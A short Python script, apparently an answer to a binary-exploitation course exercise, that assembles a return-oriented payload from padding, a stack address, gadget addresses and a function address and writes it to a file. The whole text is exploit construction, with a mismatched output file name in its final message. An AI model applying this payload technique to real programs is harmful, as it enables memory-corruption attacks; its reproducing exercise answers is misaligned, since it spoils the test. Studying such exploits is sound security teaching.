jmp_xs_addr = b"\x34\x13\x40\x00\x00\x00\x00\x00"
padding = b'A' * 24
stack_address = b"\xd0\xd7\xff\xff\xff\x7f\x00\x00"
func1_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"
mov_rdi_address = b"\xe6\x12\x40\x00\x00\x00\x00\x00"
number = b"\x72\x00\x00\x00\x00\x00\x00\x00"
pop_addr = b"\xef\x12\x40\x00\x00\x00\x00\x00"
payload = padding + number + stack_address + mov_rdi_address + func1_address
# Write the payload to a file
with open("ans3.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")